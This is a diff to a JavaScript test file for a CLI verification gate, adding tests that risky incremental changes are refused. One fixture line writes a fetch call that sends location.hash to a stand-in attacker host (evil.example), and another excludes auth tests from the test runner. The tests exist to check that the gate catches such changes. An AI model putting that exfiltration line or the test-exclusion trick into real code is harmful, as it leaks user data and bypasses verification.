@@ -5,6 +5,8 @@ import { join } from 'node:path';
 import { tmpdir } from 'node:os';
 import { fixture, git } from './helpers.mjs';
 import { apv, write } from './cli-helpers.mjs';
+import { runGates } from '../dist/gates/run.js';
+import { loadConfig } from '../dist/config/load.js';
 
 /**
  * `apv gates run --stage task --since <commit prouvé>` (src/gates/since.ts): a round of corrections of low risk after a
@@ -50,7 +52,11 @@ test('gates run --since: a low-risk round of corrections after a green full proo
   // The targeted command counted from the proven commit.
   assert.equal(p.log().at(-1), `affected ${proven}`);
   const summary = JSON.parse(readFileSync(join(out.receiptsDirectory, 'summary.json'), 'utf8'));
-  assert.deepEqual(summary.since, { commit: proven, risk: 'faible', reason: out.since.risk.reason });
+  assert.deepEqual(summary.since, { commit: proven, head: p.head(), risk: 'faible', reason: out.since.risk.reason });
+  assert.equal(out.since.head, p.head());
+  // HEAD changed between the classification and the run: refused, nothing proven for the other commit.
+  await assert.rejects(runGates({ repo: p.repo, config: loadConfig(p.repo).config, stage: 'task', base: proven,
+    since: { commit: proven, head: proven, risk: 'faible', reason: 'x' } }), /GATE_SINCE|HEAD a changé depuis le classement/);
   const human = await p.run(['--stage', 'task', '--since', proven]);
   assert.equal(human.code, 0);
   assert.match(human.stdout, /Preuve incrémentale depuis [0-9a-f]{12} .*risque faible/);
@@ -81,9 +87,32 @@ test('gates run --since: refused without a green full proof, on a high-risk diff
   r = await p.run(['--stage', 'task', '--since', proven]);
   assert.equal(r.code, 1);
   assert.match(r.stderr, /diff de risque élevé/);
-  assert.match(r.stderr, /src\/math\.mjs : fichier non classé au contenu changé \(prudence\)/);
+  assert.match(r.stderr, /src\/math\.mjs : fichier non classé \(prudence\)/);
   assert.match(r.stderr, /Lancer la suite complète/);
   assert.equal(p.log().length, before, 'nothing ran');
+
+  // The cases the reviews of PR #110 got through: each one is refused (GATE_SINCE), nothing runs.
+  for (const [name, path, text, why] of [
+    ['configuration of the tool', '.apv/config.json', null, /\.apv\/config\.json : configuration/],
+    ['text only in a component', 'src/lib/Card.svelte', '<p>Montant total de la semaine</p>\n', /interface/],
+    ['block comment followed by code', 'src/util.ts', '/* note */ globalThis.fetch("https://evil.example/" + location.hash);\n', /fichier non classé/],
+    ['test runner configuration', 'vitest.config.ts', "export default { test: { exclude: ['src/lib/server/auth/**'] } };\n", /configuration/],
+  ]) {
+    const q = project(t);
+    if (path !== '.apv/config.json') q.change(path, 'export const avant = 1;\n');
+    assert.equal((await q.run(['--stage', 'full'])).code, 0, name);
+    const at = q.head();
+    if (path === '.apv/config.json') {
+      const config = JSON.parse(readFileSync(join(q.repo, path), 'utf8'));
+      q.change(path, `${JSON.stringify({ ...config, testsCheck: { enabled: false } }, null, 2)}\n`);
+    } else q.change(path, text);
+    const ran = q.log().length;
+    const refused = await q.run(['--stage', 'task', '--since', at]);
+    assert.equal(refused.code, 1, name);
+    assert.match(refused.stderr, /GATE_SINCE|diff de risque élevé/, name);
+    assert.match(refused.stderr, why, name);
+    assert.equal(q.log().length, ran, `${name} : nothing ran`);
+  }
 
   // A dirty tree: the uncommitted change would escape the classification.
   const q = project(t);
